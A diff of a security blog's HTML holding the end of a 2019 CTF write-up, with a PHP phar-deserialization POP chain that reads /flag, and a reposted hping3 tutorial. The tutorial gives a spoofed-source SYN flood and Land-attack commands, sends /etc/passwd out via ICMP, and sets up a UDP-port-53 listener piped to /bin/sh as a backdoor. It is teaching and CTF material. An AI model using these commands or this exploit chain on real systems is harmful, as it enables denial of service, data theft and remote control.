class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source = &#x27;/flag&#x27;;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        var_dump(&#x27;__toString&#x27;);</span><br><span class="line">        $text= $this-&gt;source;</span><br><span class="line">        $text = base64_encode(file_get_contents($text));</span><br><span class="line">        return $text;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __set($key,$value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    public function _show()</span><br><span class="line">    &#123;</span><br><span class="line">        var_dump($this-&gt;source);</span><br><span class="line">        if(preg_match(&#x27;/http|https|file:|gopher|dict|\.\.|flag/i&#x27;,$this-&gt;source)) &#123;</span><br><span class="line">            die(&#x27;hacker!&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            highlight_file($this-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker~&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class S6ow</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params = array(&#x27;_show&#x27;=&gt;&#x27;file_get&#x27;);</span><br><span class="line">    public function __get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;params[$key];</span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($name, $arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        if($this-&gt;&#123;$name&#125;)</span><br><span class="line">            $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">    public function file_get($value)</span><br><span class="line">    &#123;</span><br><span class="line">        var_dump(&#x27;file_get&#x27;);</span><br><span class="line">        var_dump($this-&gt;file);</span><br><span class="line">        echo $this-&gt;file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function setter($obj)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;file = $obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Sh0w</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str-&gt;_show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sh0w = new Sh0w();</span><br><span class="line">$s6ow = new S6ow();</span><br><span class="line">$show = new Show();</span><br><span class="line"></span><br><span class="line">$s6ow-&gt;setter($show);</span><br><span class="line">$sh0w-&gt;str = $s6ow;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@unlink(&quot;phar.phar&quot;);</span><br><span class="line">$phar = new Phar(&quot;phar.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">$o = $sh0w;</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/10/19/2019%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-wp/" data-id="cl1qb1dwk0001qktugz6oai3g" data-title="2019巅峰极客-wp" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-hping3命令详解（转）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/10/19/hping3%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%EF%BC%88%E8%BD%AC%EF%BC%89/" class="article-date">
+  <time class="dt-published" datetime="2019-10-18T17:57:34.000Z" itemprop="datePublished">2019-10-19</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2019/10/19/hping3%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%EF%BC%88%E8%BD%AC%EF%BC%89/">hping3命令详解（转）</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="本文转载于"><a href="#本文转载于" class="headerlink" title="本文转载于"></a>本文转载于</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/freeking101/article/details/72582964">https://blog.csdn.net/freeking101/article/details/72582964</a></p>
+<div class="blog-content-box">
+    <div class="article-header-box">
+        <div class="article-header">
+            <div class="article-title-box">
+                <span class="article-type type-2 float-left">转载</span>                <h1 class="title-article">hping3 使用详解</h1>
+            </div>
+            <div class="article-info-box">
+                <div class="article-bar-top" style="height: 24px;">
+                                                                                                                                                                <span class="time">2017-05-20 19:29:06</span>
+                    <a class="follow-nickName" href="https://me.csdn.net/freeking101" target="_blank" rel="noopener">擒贼先擒王</a>
+                    <span class="read-count">阅读数 28236</span><span class="article_info_click" style="position: static;">更多</span>
+                                                                    <div class="tags-box space">
+                                <span class="label">分类专栏：</span>
+                                                                                                            <a class="tag-link" target="_blank" rel="noopener" href="https://blog.csdn.net/freeking101/article/category/6554606">
+                                            Kali                                        </a>
+                                                                                                </div>
+                                        </div>
+                <div class="operating">
+                                    </div>
+            </div>
+        </div>
+    </div>
+    <article class="baidu_pl">
+                <div id="article_content" class="article_content clearfix">
+                                    <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-3019150162.css">
+                                        <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-3019150162.css">
+                <div class="htmledit_views" id="content_views">
+                                            <p>&nbsp;</p>
+
+<p>hping3命令：<a target="_blank" href="http://man.linuxde.net/hping3" rel="nofollow noopener" data-token="6a666adc0401dc4b6cb4c06e65f31b9f">http://man.linuxde.net/hping3</a><br>
+Testing firewall rules with Hping3 - examples：<a target="_blank" href="http://0daysecurity.com/articles/hping3_examples.html" rel="nofollow noopener" data-token="73cf9a3e53228a6c836f43e6f967217e">http://0daysecurity.com/articles/hping3_examples.html</a></p>
+
+<p>攻防宝典：利用hping3和伪造IP地址执行DOS攻击：<a target="_blank" href="http://netsecurity.51cto.com/art/201508/489303.htm" rel="nofollow noopener" data-token="6ec1e2732cd3c8edd0fc7aa67ff321c7">http://netsecurity.51cto.com/art/201508/489303.htm</a><br>
+DoS***方法（hping3）：<a target="_blank" href="http://19920624.blog.51cto.com/9632075/1584465" rel="nofollow noopener" data-token="7b66d864340a8afa7ad74ff62ed33d40">http://19920624.blog.51cto.com/9632075/1584465</a><br>
+Nmap、Netcat、Hping3工具对比：<a target="_blank" href="http://www.2cto.com/article/201210/158961.html" rel="nofollow noopener" data-token="fafef22f5f9dcd48f713b57be753feec">http://www.2cto.com/article/201210/158961.html</a></p>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+
+<h1><a name="t0"></a>hping</h1>
+
+<p>&nbsp;</p>
+
+<p><span style="color:#7c79e5;"><strong>hping </strong></span>是 面向命令行的用于生成和解析TCP/IP协议数据包汇编/分析的开源工具。作者是Salvatore Sanfilippo，界面灵感来自ping（8）unix命令，<span style="color:#7c79e5;"><strong>目前最新版是 hping3</strong></span>，它支持TCP，UDP，ICMP和RAW-IP协议，具有跟踪路由模式，能够在覆盖的信道之间发送文件以及许多其他功能，支持使用tcl脚本自动化地调用其API。<strong>hping是安全审计、防火墙测试等工作的标配工具</strong>。<span style="color:#7c79e5;"><strong>hping 优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。</strong></span></p>
+
+<p><img alt="" class="has" src="https://img-blog.csdn.net/20180211232455000"></p>
+
+<p>虽然 hping 以前主要用作安全工具，但它可以在许多方面被不太关心安全性的人员用于测试网络和主机，您可以使用hping的一小部分内容：</p>
+
+<pre class="has" name="code"><code class="language-diff"><span class="hljs-deletion">- 防火墙测试</span>
+<span class="hljs-deletion">- 高级端口扫描</span>
+<span class="hljs-deletion">- 网络测试，使用不同的协议，TOS，分片</span>
+<span class="hljs-deletion">- 手动路径MTU发现</span>
+<span class="hljs-deletion">- 在所有支持的协议下，高级traceroute</span>
+<span class="hljs-deletion">- 远程操作系统指纹</span>
+<span class="hljs-deletion">- 远程正常运行时间猜测</span>
+<span class="hljs-deletion">- TCP/IP协议栈审计</span>
+<span class="hljs-deletion">- hping也可以用于学习TCP/IP的学生</span></code></pre>
+
+<p>工具来源：http://www.hping.org/<br><a target="_blank" href="http://www.hping.org/" rel="nofollow noopener" data-token="7f51d83cba2ad0ab7bddb7ce0b64b8c5">hping3主页</a>&nbsp;|&nbsp;<a target="_blank" href="http://git.kali.org/gitweb/?p=packages/hping3.git;a=summary" rel="nofollow noopener" data-token="285a7bdb46315ed5ee89cccf05530415">Kali hping3仓库</a></p>
+
+<pre class="has" name="code"><code class="language-sql">用法: hping3 host [options]
+  -h  <span class="hljs-comment">--help      显示帮助</span>
+  -v  <span class="hljs-comment">--version   显示版本</span>
+  -c  <span class="hljs-comment">--count     发送数据包的数目</span>
+  -i  <span class="hljs-comment">--interval  发送数据包间隔的时间 (uX即X微秒, 例如： -i u1000)</span>
+      <span class="hljs-comment">--fast      等同 -i u10000 (每秒10个包)</span>
+      <span class="hljs-comment">--faster    等同 -i u1000 (每秒100个包)</span>
+      <span class="hljs-comment">--flood      尽最快发送数据包，不显示回复。</span>
+  -n  <span class="hljs-comment">--numeric   数字化输出，象征性输出主机地址。</span>
+  -q  <span class="hljs-comment">--quiet     安静模式</span>
+  -I  <span class="hljs-comment">--interface 网卡接口 (默认路由接口)</span>
+  -V  <span class="hljs-comment">--verbose   详细模式</span>
+  -D  <span class="hljs-comment">--debug     调试信息</span>
+  -z  <span class="hljs-comment">--bind      绑定ctrl+z到ttl(默认为目的端口)</span>
+  -Z  <span class="hljs-comment">--unbind    取消绑定ctrl+z键</span>
+      <span class="hljs-comment">--beep      对于接收到的每个匹配数据包蜂鸣声提示</span>
+
+模式选择
+  default mode     TCP   // 默认模式是 TCP
+  -0  <span class="hljs-comment">--rawip      RAWIP模式，原始IP模式。在此模式下HPING会发送带数据的IP头。即裸IP方式。使用RAWSOCKET方式。</span>
+  -1  <span class="hljs-comment">--icmp       ICMP模式，此模式下HPING会发送IGMP应答报，你可以用--ICMPTYPE --ICMPCODE选项发送其他类型/模式的ICMP报文。</span>
+  -2  <span class="hljs-comment">--udp        UDP 模式，缺省下，HPING会发送UDP报文到主机的0端口，你可以用--baseport --destport --keep选项指定其模式。</span>
+  -8  <span class="hljs-comment">--scan       SCAN mode. //扫描模式 指定扫描对应的端口。</span>
+                   Example: hping <span class="hljs-comment">--scan 1-30,70-90 -S www.target.host    // 扫描</span>
+  -9  <span class="hljs-comment">--listen     listen mode  // 监听模式</span>
+  
+IP 模式
+  -a  <span class="hljs-comment">--spoof      spoof source address  //源地址欺骗。伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。</span>
+  <span class="hljs-comment">--rand-dest      random destionation address mode. see the man. // 随机目的地址模式。详细使用 man 命令</span>
+  <span class="hljs-comment">--rand-source    random source address mode. see the man.       // 随机源地址模式。详细使用 man 命令</span>
+  -t  <span class="hljs-comment">--ttl        ttl (默认 64)  //修改 ttl 值</span>
+  -N  <span class="hljs-comment">--id         id (默认 随机)  // hping 中的 ID 值，缺省为随机值</span>
+  -W  <span class="hljs-comment">--winid      使用win* id字节顺序  //使用winid模式，针对不同的操作系统。UNIX ,WINDIWS的id回应不同的，这选项可以让你的ID回应和WINDOWS一样。</span>
+  -r  <span class="hljs-comment">--rel        相对id字段(估计主机流量)  //更改ID的，可以让ID曾递减输出，详见HPING-HOWTO。</span>
+  -f  <span class="hljs-comment">--frag       拆分数据包更多的frag.  (may pass weak acl)   //分段，可以测试对方或者交换机碎片处理能力，缺省16字节。</span>
+  -x  <span class="hljs-comment">--morefrag   设置更多的分段标志    // 大量碎片，泪滴攻击。</span>
+  -y  <span class="hljs-comment">--dontfrag   设置不分段标志    // 发送不可恢复的IP碎片，这可以让你了解更多的MTU PATH DISCOVERY。</span>
+  -g  <span class="hljs-comment">--fragoff    set the fragment offset    // 设置断偏移。</span>
+  -m  <span class="hljs-comment">--mtu        设置虚拟最大传输单元, implies --frag if packet size &gt; mtu    // 设置虚拟MTU值，当大于mtu的时候分段。</span>
+  -o  <span class="hljs-comment">--tos        type of service (default 0x00), try --tos help          // tos字段，缺省0x00，尽力而为？</span>
+  -G  <span class="hljs-comment">--rroute     includes RECORD_ROUTE option and display the route buffer    // 记录IP路由，并显示路由缓冲。</span>
+  <span class="hljs-comment">--lsrr           松散源路由并记录路由        // 松散源路由</span>
+  <span class="hljs-comment">--ssrr           严格源路由并记录路由      // 严格源路由</span>
+  -H  <span class="hljs-comment">--ipproto    设置IP协议字段，仅在RAW IP模式下使用   //在RAW IP模式里选择IP协议。设置ip协议域，仅在RAW ip模式使用。</span>
+
+ICMP 模式
+  -C  <span class="hljs-comment">--icmptype   icmp类型(默认echo请求)    // ICMP类型，缺省回显请求。</span>
+  -K  <span class="hljs-comment">--icmpcode   icmp代号(默认0)     // ICMP代码。</span>
+      <span class="hljs-comment">--force-icmp 发送所有icmp类型(默认仅发送支持的类型)    // 强制ICMP类型。</span>
+      <span class="hljs-comment">--icmp-gw    设置ICMP重定向网关地址(默认0.0.0.0)    // ICMP重定向</span>
+      <span class="hljs-comment">--icmp-ts    等同 --icmp --icmptype 13 (ICMP 时间戳)            // icmp时间戳</span>
+      <span class="hljs-comment">--icmp-addr  等同 --icmp --icmptype 17 (ICMP 地址子网掩码)  // icmp子网地址</span>
+      <span class="hljs-comment">--icmp-help  显示其他icmp选项帮助      // ICMP帮助</span>
+
+UDP/TCP 模式
+  -s  <span class="hljs-comment">--baseport   base source port             (default random)              // 缺省随机源端口</span>
+  -p  <span class="hljs-comment">--destport   [+][+]&lt;port&gt; destination port(default 0) ctrl+z inc/dec    // 缺省随机源端口</span>
+  -k  <span class="hljs-comment">--keep       keep still source port      // 保持源端口</span>
+  -w  <span class="hljs-comment">--win        winsize (default 64)        // win的滑动窗口。windows发送字节(默认64)</span>
+  -O  <span class="hljs-comment">--tcpoff     set fake tcp data offset     (instead of tcphdrlen / 4)    // 设置伪造tcp数据偏移量(取代tcp地址长度除4)</span>
+  -Q  <span class="hljs-comment">--seqnum     shows only tcp sequence number        // 仅显示tcp序列号</span>
+  -b  <span class="hljs-comment">--badcksum   (尝试)发送具有错误IP校验和数据包。许多系统将修复发送数据包的IP校验和。所以你会得到错误UDP/TCP校验和。</span>
+  -M  <span class="hljs-comment">--setseq     设置TCP序列号 </span>
+  -L  <span class="hljs-comment">--setack     设置TCP的ack   ------------------------------------- (不是 TCP 的 ACK 标志位)</span>
+  -F  <span class="hljs-comment">--fin        set FIN flag</span>
+  -S  <span class="hljs-comment">--syn        set SYN flag</span>
+  -R  <span class="hljs-comment">--rst        set RST flag</span>
+  -P  <span class="hljs-comment">--push       set PUSH flag</span>
+  -A  <span class="hljs-comment">--ack        set ACK flag   ------------------------------------- （设置 TCP 的 ACK 标志 位）</span>
+  -U  <span class="hljs-comment">--urg        set URG flag      // 一大堆IP抱头的设置。</span>
+  -X  <span class="hljs-comment">--xmas       set X unused flag (0x40)</span>
+  -Y  <span class="hljs-comment">--ymas       set Y unused flag (0x80)</span>
+  <span class="hljs-comment">--tcpexitcode    使用last tcp-&gt; th_flags作为退出码</span>
+  <span class="hljs-comment">--tcp-mss        启用具有给定值的TCP MSS选项</span>
+  <span class="hljs-comment">--tcp-timestamp  启用TCP时间戳选项来猜测HZ/uptime</span>
+
+Common //通用设置
+  -d  <span class="hljs-comment">--data       data size    (default is 0)    // 发送数据包大小，缺省是0。</span>
+  -E  <span class="hljs-comment">--file       文件数据</span>
+  -e  <span class="hljs-comment">--sign       添加“签名”</span>
+  -j  <span class="hljs-comment">--dump       转储为十六进制数据包</span>
+  -J  <span class="hljs-comment">--print      转储为可打印字符</span>
+  -B  <span class="hljs-comment">--safe       启用“安全”协议</span>
+  -u  <span class="hljs-comment">--end        告诉你什么时候--file达到EOF并防止倒回</span>
+  -T  <span class="hljs-comment">--traceroute traceroute模式(等同使用 --bind 且--ttl 1)</span>
+  <span class="hljs-comment">--tr-stop        在traceroute模式下收到第一个不是ICMP时退出</span>
+  <span class="hljs-comment">--tr-keep-ttl    保持源TTL固定，仅用于监视一跳</span>
+  <span class="hljs-comment">--tr-no-rtt       不要在跟踪路由模式下计算/显示RTT信息 ARS包描述（新增功能，不稳定）</span>
+ARS packet description (new, unstable)
+  <span class="hljs-comment">--apd-send       发送APD描述数据包(参见docs / APD.txt)</span></code></pre>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+
+<h1><a name="t1"></a>Hping3 功能</h1>
+
+<p>&nbsp;</p>
+
+<p><span style="color:#2d374b;">Hping3 主要有以下典型功能应用：</span></p>
+
+<p>&nbsp;</p>
+
+<h2><a name="t2"></a>防火墙测试</h2>
+
+<p><span style="color:#2d374b;">使用Hping3指定各种数据包字段，依次对防火墙进行详细测试。请参考：http://0daysecurity.com/articles/hping3_examples.html&nbsp;</span></p>
+
+<p><span style="color:#2d374b;">测试防火墙对ICMP包的反应、是否支持traceroute、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。</span></p>
+
+<pre class="has" name="code"><code class="language-css"><span class="hljs-selector-tag">hping3</span> <span class="hljs-selector-tag">-S</span> <span class="hljs-selector-tag">-c</span> 1000000 <span class="hljs-selector-tag">-a</span> 10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.10</span> <span class="hljs-selector-tag">-p</span> 21 10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.10</span></code></pre>
+
+<p>&nbsp;</p>
+
+<h2><a name="t3"></a>端口扫描</h2>
+
+<p>&nbsp;</p>
+
+<p><span style="color:#2d374b;">Hping3也可以对目标端口进行扫描。Hping3支持指定TCP各个标志位、长度等信息。以下示例可用于探测目标机的80端口是否开放：</span></p>
+
+<pre class="has" name="code"><code class="language-css"><span class="hljs-selector-tag">hping3</span> <span class="hljs-selector-tag">-I</span> <span class="hljs-selector-tag">eth0</span> <span class="hljs-selector-tag">-S</span> 192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.1</span> <span class="hljs-selector-tag">-p</span> 80</code></pre>
+
+<p><span style="color:#2d374b;">其中-I eth0指定使用eth0端口，-S指定TCP包的标志位SYN，-p 80指定探测的目的端口。&nbsp;</span></p>
+
+<p><span style="color:#2d374b;">hping3支持非常丰富的端口探测方式，nmap拥有的扫描方式hping3几乎都支持（除开connect方式，因为Hping3仅发送与接收包，不会维护连接，所以不支持connect方式探测）。而且Hping3能够对发送的探测进行更加精细的控制，方便用户微调探测结果。当然，Hping3的端口扫描性能及综合处理能力，无法与Nmap相比。一般使用它仅对少量主机的少量端口进行扫描。</span></p>
+
+<p>&nbsp;</p>
+
+<h2><a name="t4"></a>Idle扫描</h2>
+
+<p><span style="color:#2d374b;">Idle扫描（Idle Scanning）是一种匿名扫描远程主机的方式，该方式也是有Hping3的作者Salvatore Sanfilippo发明的，目前Idle扫描在Nmap中也有实现。&nbsp;</span></p>
+
+<p><span style="color:#2d374b;">该扫描原理是：寻找一台idle主机（该主机没有任何的网络流量，并且IPID是逐个增长的），攻击端主机先向idle主机发送探测包，从回复包中获取其IPID。冒充idle主机的IP地址向远程主机的端口发送SYN包（此处假设为SYN包），此时如果远程主机的目的端口开放，那么会回复SYN/ACK，此时idle主机收到SYN/ACK后回复RST包。然后攻击端主机再向idle主机发送探测包，获取其IPID。那么对比两次的IPID值，我们就可以判断远程主机是否回复了数据包，从而间接地推测其端口状态。</span></p>
+
+<p>&nbsp;</p>
+
+<h2><a name="t5"></a>拒绝服务攻击</h2>
+
+<p><span style="color:#2d374b;">使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。</span></p>
+
+<pre class="has" name="code"><code class="language-css"><span class="hljs-selector-tag">hping3</span> <span class="hljs-selector-tag">-I</span> <span class="hljs-selector-tag">eth0</span> <span class="hljs-selector-tag">-a192</span><span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.99</span> <span class="hljs-selector-tag">-S</span> 192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.33</span> <span class="hljs-selector-tag">-p</span> 80 <span class="hljs-selector-tag">-i</span> <span class="hljs-selector-tag">u1000</span></code></pre>
+
+<p><span style="color:#2d374b;">其他攻击如smurf、teardrop、land attack等也很容易构建出来。</span></p>
+
+<p>&nbsp;</p>
+
+<h2><a name="t6"></a>文件传输</h2>
+
+<p><span style="color:#2d374b;">Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：</span></p>
+
+<pre class="has" name="code"><code class="language-css"><span class="hljs-selector-tag">hping3</span> 192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.159--listen</span> <span class="hljs-selector-tag">signature</span> <span class="hljs-selector-tag">--safe</span> <span class="hljs-selector-tag">--icmp</span></code></pre>
+
+<p><span style="color:#2d374b;">监听ICMP包中的签名，根据签名解析出文件内容。&nbsp;</span></p>
+
+<p><span style="color:#2d374b;">在发送端使用签名打包的ICMP包发送文件：</span></p>
+
+<pre class="has" name="code"><code class="language-delphi">hping3 <span class="hljs-number">192.168</span>.<span class="hljs-number">1.108</span>--icmp ?d <span class="hljs-number">100</span> --sign signature --<span class="hljs-keyword">file</span> /etc/passwd</code></pre>
+
+<p><span style="color:#2d374b;">将/etc/passwd密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。</span></p>
+
+<p>&nbsp;</p>
+
+<h2><a name="t7"></a>木马功能</h2>
+
+<p><span style="color:#2d374b;">如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与netcat的后门功能类似。</span></p>
+
+<p><span style="color:#2d374b;">示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。&nbsp;</span></p>
+
+<p><span style="color:#2d374b;">在木马启动端：</span></p>
+
+<pre class="has" name="code"><code class="language-javascript">hping3 <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.66</span>--listen signature --safe --udp -p <span class="hljs-number">53</span> | <span class="hljs-regexp">/bin/</span>sh</code></pre>
+
+<p><span style="color:#2d374b;">在远程控制端：</span></p>
+
+<pre class="has" name="code"><code class="language-delphi">echo ls &gt;test.cmd 
+hping3 <span class="hljs-number">192.168</span>.<span class="hljs-number">10.44</span> -p53 -d <span class="hljs-number">100</span> --udp --sign siganature --<span class="hljs-keyword">file</span> ./test.cmd</code></pre>
+
+<p><span style="color:#2d374b;">将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。&nbsp;</span></p>
+
+<p><span style="color:#2d374b;">当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。</span></p>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+
+<h1><a name="t8"></a>fping 用法</h1>
+
+<p>&nbsp;</p>
+
+<p><strong><a target="_blank" href="http://www.fping.org/" rel="nofollow noopener" data-token="bc6d466d524e8d697358f675eea88a67">fping 官网</a></strong></p>
+
+<p>&nbsp; &nbsp; &nbsp; &nbsp; fping 是一个将&nbsp; ICMP echo 探测器发送到网络主机的程序，类似于 ping，可以看作是 ping 的增强版。但是 fping 在 ping多个主机时性能更好。</p>
+
+<pre class="has" name="code"><code class="language-sql">Usage: fping [options] [targets...]
+   -a         显示存活目标，即可ping通的目标
+   -A         将目标以ip地址的形式显示
+   -b n       ping 数据包的大小。（默认为56）
+   -B f       <span class="hljs-keyword">set</span> exponential backoff factor <span class="hljs-keyword">to</span> f
+   -c n       ping每个目标的次数 (默认为<span class="hljs-number">1</span>)
+   -C n       同-c, 返回的结果为冗长格式
+   -D         每个输出行打印时间戳
+   -e         显示返回数据包所费时间
+   -f <span class="hljs-keyword">file</span>    从文件获取目标列表( - 表示从标准输入)(不能与 -g 同时使用)
+   -g         生成目标列表(不能与 -f 同时使用)
+                (可指定目标的开始和结束IP， 或者提供ip的子网掩码)
+                (例：fping -g <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.255</span> 或 fping -g <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span>)                
+   -H n       设置ip的TTL值 (生存时间)
+   -i n       ping包之间的间隔(单位：毫秒)(默认<span class="hljs-number">25</span>)
+   -I <span class="hljs-keyword">if</span>      绑定到特定的接口
+   -l         循环发送ping
+   -m         ping目标主机的多个网口
+   -M         设置不分段标记
+   -n         将目标以主机名或域名显示(等价于 -d )
+   -N         输出兼容netdata (-l -Q <span class="hljs-keyword">are</span> <span class="hljs-keyword">required</span>)
+   -o         显示累计中断时间 (lost packets * packet <span class="hljs-built_in">interval</span>)
+   -O n       在ICMP包中设置服务的类型(tos)标志
+   -p n       对同一个目标的ping包间隔(毫秒)
+                 (在循环和统计模式中，默认为<span class="hljs-number">1000</span>)
+   -q         安静模式(不显示每个目标或每个ping的结果)
+   -Q n       同-q, 但是每n秒显示信息概要
+   -r n       当ping失败时，最大重试次数(默认为<span class="hljs-number">3</span>次)
+   -R         random packet <span class="hljs-keyword">data</span> (<span class="hljs-keyword">to</span> foil <span class="hljs-keyword">link</span> <span class="hljs-keyword">data</span> compression)
+   -s         打印最后的统计数据
+   -S addr    设置源ip地址
+   -t n       单个目标的超时时间(毫秒)(默认<span class="hljs-number">500</span>)
+   -T n       请忽略(为兼容fping <span class="hljs-number">2.4</span>)
+   -u         显示不可到达的目标
+   -v         显示版本号
+   targets    需要ping的目标列表(不能和 -f 同时使用)</code></pre>
+
+<p>示例</p>
+
+<pre class="has" name="code"><code class="language-css"><span class="hljs-selector-tag">fping</span> <span class="hljs-selector-tag">-A</span> <span class="hljs-selector-tag">-u</span> <span class="hljs-selector-tag">-c</span> 4 192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.1</span> 192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.74</span> 192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.20</span></code></pre>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+
+<h1><a name="t9"></a>ping 用法</h1>
+
+<p>&nbsp;</p>
+
+<p><strong>ping 命令&nbsp;&nbsp;<a target="_blank" href="http://man.linuxde.net/ping" rel="nofollow noopener" data-token="25c8a7aefd5da2833359a7d55befa227">http://man.linuxde.net/ping</a></strong></p>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+                                    </div>
+                    </div>
+    </article>
+    <div class="postTime"> 
+        <div class="article-bar-bottom">
+            <span class="time">
+                文章最后发布于: 2017-05-20 19:29:06            </span>
+        </div>
+    </div>
+</div>
+      
+    </div>
+    <footer class="article-footer">
